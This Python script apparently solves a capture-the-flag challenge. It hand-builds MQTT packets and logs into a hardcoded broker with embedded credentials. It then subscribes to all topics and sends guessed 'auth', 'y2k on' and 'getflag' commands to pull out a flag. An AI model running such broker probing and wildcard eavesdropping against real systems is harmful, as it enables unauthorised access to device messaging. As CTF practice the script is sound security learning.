import socket
import struct
import time
import json
import random
import string

def encode_rem_len(length):
    res = b''
    while True:
        byte = length % 128
        length //= 128
        if length > 0: res += bytes([byte | 0x80])
        else:
            res += bytes([byte])
            break
    return res

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username: payload += struct.pack("!H", len(username)) + username.encode()
    if password: payload += struct.pack("!H", len(password)) + password.encode()
    return b'\x10' + encode_rem_len(len(var_header) + len(payload)) + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    return b'\x82' + encode_rem_len(len(var_header) + len(payload)) + var_header + payload

def mqtt_publish(topic, message):
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    return b'\x30' + encode_rem_len(rem_len) + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    client_id = "solver_" + ''.join(random.choices(string.digits, k=8))
    s.sendall(mqtt_connect(client_id, user, pwd))
    connack = s.recv(4)
    print(f"[*] Connack: {connack.hex()}")
    
    resp_topic = "response/" + client_id
    s.sendall(mqtt_subscribe("#", 1))
    s.sendall(mqtt_subscribe("response/#", 2))
    s.sendall(mqtt_subscribe("flag/#", 3))
    s.sendall(mqtt_subscribe("ctf/#", 4))
    
    # Text commands:
    cmds = [
        f"auth {client_id}",
        "y2k on",
        f"getflag Nobody like mosquitoes {resp_topic}",
        f"getflag Nobody_like_mosquitoes {resp_topic}",
        f"getflag \"Nobody like mosquitoes\" {resp_topic}",
        "flag"
    ]
    
    # JSON commands:
    json_cmds = [
        {"cmd": "auth", "token": 0, "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "challenge": "Nobody like mosquitoes", "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "challenge": "Nobody like mosquitoes", "y2k": True}
    ]
    
    for c in cmds:
        print(f"[*] Sending text: {c}")
        s.sendall(mqtt_publish("ctf/hackday", c))
        time.sleep(0.5)
    
    for c in json_cmds:
        msg = json.dumps(c)
        print(f"[*] Sending JSON: {msg}")
        s.sendall(mqtt_publish("ctf/hackday", msg))
        time.sleep(0.5)

    start_time = time.time()
    try:
        while time.time() - start_time < 30:
            data = s.recv(4096)
            if not data: break
            decoded = data.decode(errors='ignore')
            print(f"[*] Received: {decoded[:200]}")
            if "HACKDAY{" in decoded:
                print(f"[!!!] FLAG: {decoded[decoded.find('HACKDAY{'):decoded.find('HACKDAY{')+100]}")
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
